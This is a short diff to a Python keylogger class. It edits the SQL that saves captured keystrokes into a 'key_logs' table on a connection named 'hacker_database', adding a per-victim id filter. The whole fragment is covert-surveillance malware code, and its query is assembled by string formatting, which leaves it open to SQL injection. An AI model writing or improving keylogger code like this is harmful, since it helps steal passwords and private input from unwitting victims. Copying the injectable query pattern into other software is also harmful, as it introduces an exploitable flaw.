@@ -67,7 +67,7 @@ class KeyLogger:
 
         message = str(keys) + str(self.key_log)
 
-        command = "UPDATE `key_logs` SET `keys` = '{}'".format(message)
+        command = "UPDATE `key_logs` SET `keys` = '{}' WHERE `p_id` = {}".format(str(message), self.p_id)
         my_cursor.execute(command)
         hacker_database.commit()
 
